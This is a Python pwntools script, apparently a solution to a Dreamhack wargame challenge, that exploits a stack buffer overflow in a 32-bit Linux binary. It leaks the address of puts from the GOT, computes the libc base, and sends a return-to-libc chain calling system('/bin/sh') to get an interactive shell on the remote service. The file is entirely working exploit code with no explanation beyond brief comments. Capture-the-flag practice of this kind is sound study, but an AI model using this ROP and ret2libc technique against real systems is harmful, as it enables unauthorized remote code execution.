# Name: basic_rop_x86.py

from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'

def slog(name, addr):
    success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 12198

# conn = process('./basic_rop_x86') # local
conn = remote(HOST, PORT)
e = ELF('./basic_rop_x86')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6') # local
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']

buf = b'A' * 0x40
padding = b'B' * 0x4
SFP = b'C' * 0x4

payload = buf + padding + SFP

# puts(puts@got)
payload += p32(puts_plt)
payload += p32(e.sym['main'])
payload += p32(puts_got)

conn.send(payload)

conn.recvuntil(buf)

puts = u32(conn.recvn(4))
lb = puts - libc.sym['puts']
system = lb + libc.sym['system']
sh = lb + list(libc.search(b'/bin/sh'))[0]

slog('libc_base', lb)
slog('puts', puts)
slog('system', system)
slog('/bin/sh', sh)

# system("/bin/sh")
payload = buf + padding + SFP
payload += p32(system)
payload += p32(1)
payload += p32(sh)

conn.send(payload)
conn.interactive()